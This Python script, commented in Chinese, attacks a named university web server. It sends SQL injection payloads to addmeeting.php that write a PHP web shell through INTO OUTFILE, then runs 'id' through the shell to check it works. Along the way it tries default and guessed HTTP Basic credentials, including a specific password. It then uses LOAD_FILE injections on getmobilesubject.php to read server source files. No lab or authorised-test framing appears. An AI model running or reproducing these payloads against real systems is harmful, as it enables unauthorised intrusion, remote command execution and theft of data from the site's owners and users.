#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/enmeeting/addmeeting.php"

print("[*] 利用addmeeting.php的SQL注入...")

# 从源码分析发现：Line 85有SQL注入
# mysql_query("INSERT INTO mgroup (USER_ID , MEETING_ID , POSITION_ID) VALUES ('$user[USER_ID]' , '$_POST[Meeting_Id]' , '$_POST[Position_Id]')");

# 需要先绕过认证，或者找到认证绕过方法
# 尝试直接POST请求
post_data = {
    "Meeting_Id": "1' UNION SELECT '<?php system($_GET[c]); ?>',2,3 INTO OUTFILE '/var/www/html/enmeeting/shell.php'--",
    "Position_Id": "1",
    "user[USER_ID]": "1' UNION SELECT '<?php system($_GET[c]); ?>',2,3 INTO OUTFILE '/var/www/html/enmeeting/shell.php'--",
}

# 尝试HTTP认证
from requests.auth import HTTPBasicAuth
auths = [
    HTTPBasicAuth("admin", "admin"),
    HTTPBasicAuth("root", "root"),
    HTTPBasicAuth("mysql", "Mu123.123."),
]

for auth in auths:
    resp = requests.post(url, data=post_data, auth=auth, verify=False, timeout=5)
    if resp.status_code == 200:
        test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
        if "uid=" in test_shell.text:
            print(f"[+] Shell获取成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
            exit(0)

# 尝试通过SQL注入读取敏感信息
print("[*] 通过getmobilesubject.php读取敏感文件...")
sqli_url = "https://olympic.su.ac.th/enmeeting/getmobilesubject.php"

# 使用更简单的payload避免超时
simple_payloads = [
    "1 UNION SELECT LOAD_FILE('/var/www/html/banpot/scmeeting/x.php'),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
    "1 UNION SELECT HEX(LOAD_FILE('/var/www/html/banpot/scmeeting/x.php')),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17",
]

for payload in simple_payloads:
    try:
        resp = requests.get(sqli_url, params={"subjectid": payload}, verify=False, timeout=5)
        if "<?php" in resp.text or len(resp.text) > 100:
            print(f"[+] 读取成功: {payload[:50]}...")
            print(resp.text[:500])
            if "<?php" in resp.text:
                print("="*70)
                print(resp.text)
                print("="*70)
                exit(0)
    except:
        pass

print("[-] 继续尝试...")
